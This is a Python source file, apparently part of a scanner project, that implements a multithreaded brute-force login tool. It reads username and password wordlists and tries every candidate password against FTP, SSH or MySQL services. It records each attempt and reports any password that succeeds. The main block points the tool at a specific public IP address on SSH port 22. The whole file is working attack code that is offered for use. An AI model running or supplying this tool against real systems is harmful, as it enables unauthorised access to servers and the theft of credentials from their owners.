import queue
__author__ = 'Yodidi'
print('bru')
import threading
import time
import traceback
from ftplib import FTP
import paramiko as paramiko
import pymysql as pymysql
class Brute:
    """
    协议爆破
    """
    def __init__(self, protocol, ip, port, thread_num, username_path, pwd_path):
        self.protocol = protocol
        self.ip = ip
        self.port = port
        self.thread_num = thread_num
        self.username_path = username_path
        self.pwd_path = pwd_path

        self.q_user = queue.Queue()
        self.q_pwd = queue.Queue()

        self.lock = threading.Lock()
        self.thread_control = None
        try:
            with open(self.username_path) as f:  # 添加用户名到列队
                for user in f.readlines():
                    user = user.strip('\n')
                    print(user)
                    self.q_user.put(user)
        except FileNotFoundError as e:
            # print(e.with_traceback())
            print(traceback.print_exc())
        try:
            with open(self.pwd_path) as f:  # 添加密码到列队
                for password in f.readlines():
                    pas = password.strip('\n')
                    print(pas)
                    self.q_pwd.put(pas)
        except Exception as e:
            # print(e.with_traceback())
            print(traceback.print_exc())
        self.user = self.q_user.get()
        self.result = []
    def run(self):
        thread = []
        try:
            # thread_control = threading.Thread(target=self._control)
            # thread_control.start()
            # thread_control.join()
            for i in range(int(self.thread_num)):
                f = threading.Thread(target=self._mode)
                f.start()
                thread.append(f)
            for i in thread:
                i.join()
        except:
            traceback.print_exc()
        time.sleep(2)
        print(self.result)
        return self.result

    def _mode(self):
        while True:
            if self.q_user == 0 and self.q_pwd == 0:
                break
            try:
                pwd = self.q_pwd.get(timeout=5)  # 密码列队为空时 10秒内没数据 就结束
            except:
                break
            try:
                print("[*] %s try host:%s --> port:%s --> user:%s --> pwd:%s" % (
                self.protocol, self.ip, self.port, self.user, pwd))
                self.result.append("[*] %s try host:%s --> port:%s --> user:%s --> pwd:%s" % (self.protocol, self.ip, self.port, self.user, pwd))
                if self.protocol == "FTP":
                    ftp = FTP()
                    ftp.connect(self.ip, self.port)
                    ftp.login(self.user, pwd)
                    ftp.quit()
                if self.protocol == "SSH":
                    print("SSH爆破")
                    ssh = paramiko.SSHClient()  # 创建SSH对象
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 允许连接不在known_hosts文件上的主机
                    ssh.connect(hostname=self.ip, port=self.port, username=self.user, password=pwd,timeout=3)

                    ssh.close()  # 关闭
                if self.protocol == "MYSQL":
                    mysql = pymysql.connect(host=self.ip, port=self.port, user=self.user, passwd=pwd, db='mysql')
                    mysql.close()  # 关闭mysql连接
                self.lock.acquire()  # 加锁
                self.result.append("[+] %s 成功 host:%s --> port:%s --> user:%s --> pwd:%s" % (self.protocol, self.ip, self.port, self.user, pwd))
                print("[+] %s 成功 host:%s --> port:%s --> user:%s --> pwd:%s" % (self.protocol, self.ip, self.port, self.user, pwd))
                while not self.q_pwd.empty():  # 密码正确后 清理密码列队
                    self.q_pwd.get()
                self.lock.release()  # 解锁
            except BaseException as e:
                # self.result.append("[-] "+str(e))
                print(str(e))

    # def _control(self):
    #     while True:
    #         if self.q_pwd.qsize() == 0:  # 判断是否还有密码列队
    #             if self.q_user.qsize() == 0:  # 判断是否还有账号列队
    #                 break
    #             else:
    #                 self.user = self.q_user.get()
    #                 try:
    #                     with open(self.pwd_path) as f:  # 添加密码到列队
    #                         for password in f.readlines():
    #                             pas = password.strip('\n')
    #                             self.q_pwd.put(pas)
    #                 except Exception as e:
    #                     print(e)


if __name__ == '__main__':
    brute = Brute(protocol="SSH", ip="119.28.182.161", port=22, thread_num=5, username_path="E:\\DD\\DDScannerPower-master\\resources\\dict\\userdict.txt", pwd_path="E:\\DD\\DDScannerPower-master\\resources\\dict\\pwddict.txt")
    result = brute.run()
    print(result)
